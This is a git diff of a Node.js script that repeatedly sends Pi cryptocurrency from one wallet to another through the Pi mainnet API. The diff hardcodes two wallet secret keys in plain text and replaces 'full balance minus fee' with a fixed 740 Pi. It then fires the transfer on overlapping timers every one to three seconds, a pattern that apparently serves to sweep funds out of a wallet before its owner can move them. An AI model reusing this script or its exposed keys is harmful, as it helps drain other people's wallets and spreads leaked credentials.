@@ -2,13 +2,14 @@ const StellarSdk = require('stellar-sdk');
 const axios = require('axios');
 
 const server = new StellarSdk.Server('https://api.mainnet.minepi.com');
-const senderSecret = 'SDEWKP36AFA4LOB5YKZJMWFOXZIJ5RQJ6BSDVSCAFY5OMTJILLYDW4SD'; // YOUR SENDER SECRET
+const senderSecret = 'SCYGZLZKIVCEZZL7LXMYXMBM4VAOEFPSCY5HCARNS35R2AQXIXOYBSUQ'; // YOUR SENDER SECRET
 const senderKeypair = StellarSdk.Keypair.fromSecret(senderSecret);
 const senderPublic = senderKeypair.publicKey();
 const apiUrl = `https://api.mainnet.minepi.com/accounts/${senderPublic}`;
-const recipient = 'GD2E7TJ62WCVTPYORLVLG4QP3VWGDJA2VMUOZSIQOITKSZRJCSFFNSCG';
+const recipient = 'GA4UDWS5GKMDCD7EQKK3ST7MJ3BFNHW4Z3KYS26GLUKD764TJA46QDDI';
 
-async function sendPi() {
+async function sendPi(po) {
+    console.log(po);
     try {
         console.log('🔐 Sender Public Key:', senderPublic);
         const account = await server.loadAccount(senderPublic);
@@ -21,7 +22,9 @@ async function sendPi() {
         console.log(typeof amount1) // string
         console.log(`Pi Balance : ${res.data.balances[0].balance}`);
 
-        const withdrawAmount = Number(amount1) - Number("0.01");
+        // const withdrawAmount = Number(amount1) - Number("0.01")
+         const withdrawAmount = Number("740");
+        console.log(`Withdraw Amount: ${withdrawAmount}`);
         console.log(typeof withdrawAmount.toString())
 
         const tx = new StellarSdk.TransactionBuilder(account, {
@@ -48,8 +51,60 @@ async function sendPi() {
 
 // Send every 3 seconds
 setInterval(() => {
-    sendPi();
+    sendPi("Hi1");
 }, 3000);
 
 
+// Send every 3 seconds
+setInterval(() => {
+    sendPi("hi2");
+}, 1000);
 
+// setInterval(() => {
+//     sendPi("Hi3");
+// }, 3000);
+
+
+// // Send every 3 seconds
+// setInterval(() => {
+//     sendPi("hi2");
+// }, 4000);
+// setInterval(() => {
+//     sendPi("Hi3");
+// }, 3000);
+
+
+// // Send every 3 seconds
+// setInterval(() => {
+//     sendPi("hi4");
+// }, 5000);
+
+// setInterval(() => {
+//     sendPi("Hi5");
+// }, 500);
+
+
+// // Send every 3 seconds
+// setInterval(() => {
+//     sendPi("hi6");
+// }, 700);
+
+// setInterval(() => {
+//     sendPi("Hi7");
+// }, 900);
+
+
+// // Send every 3 seconds
+// setInterval(() => {
+//     sendPi("hi8");
+// }, 900);
+
+// setInterval(() => {
+//     sendPi("Hi9");
+// }, 6000);
+
+
+// // Send every 3 seconds
+// setInterval(() => {
+//     sendPi("hi10");
+// }, 1500);
